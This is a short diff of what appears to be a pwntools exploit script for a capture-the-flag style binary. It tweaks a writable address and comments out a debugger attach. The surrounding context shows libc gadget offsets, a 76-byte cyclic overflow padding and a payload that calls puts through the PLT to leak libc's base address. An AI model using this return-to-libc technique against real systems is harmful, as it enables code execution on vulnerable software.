@@ -9,9 +9,9 @@ PR = 0x0804901e
 # relative address of libc
 PPR = 0x3958a
 PPPR = 0x4cab8
-writable_addr = 0x804c800
+writable_addr = 0x804c700
 # debug
-gdb.attach(io, "b *(start+163)") # we can raise a debug interface here
+# gdb.attach(io, "b *(start+163)") # we can raise a debug interface here
 # 1: get the address of puts and calculate the base address of libc
 payload = cyclic(76) 
 payload += p32(elf.plt['puts'])
